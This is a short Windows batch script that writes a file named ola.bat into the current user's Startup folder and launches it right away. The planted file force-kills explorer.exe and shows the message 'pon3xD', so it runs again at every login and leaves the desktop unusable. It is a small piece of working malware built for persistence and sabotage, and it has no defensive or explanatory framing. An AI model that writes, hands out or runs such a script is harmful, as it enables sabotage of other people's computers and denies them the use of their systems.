@echo off

cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off >> ola.bat
echo taskkill /f /im explorer.exe >> ola.bat
echo msg * pon3xD >> ola.bat
msg * applied
timeout 2 >> nul
start ola.bat